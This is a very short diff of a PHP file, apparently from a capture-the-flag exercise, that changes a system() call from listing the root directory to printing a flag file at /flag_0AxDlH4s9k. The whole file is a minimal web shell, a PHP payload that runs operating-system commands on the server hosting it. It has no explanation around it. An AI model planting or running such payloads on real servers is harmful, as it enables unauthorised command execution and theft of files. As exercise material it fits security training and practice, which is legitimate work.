@@ -1,5 +1,5 @@
 <?php 
-system("ls /");
+system("cat /flag_0AxDlH4s9k");
 ?>
 
 
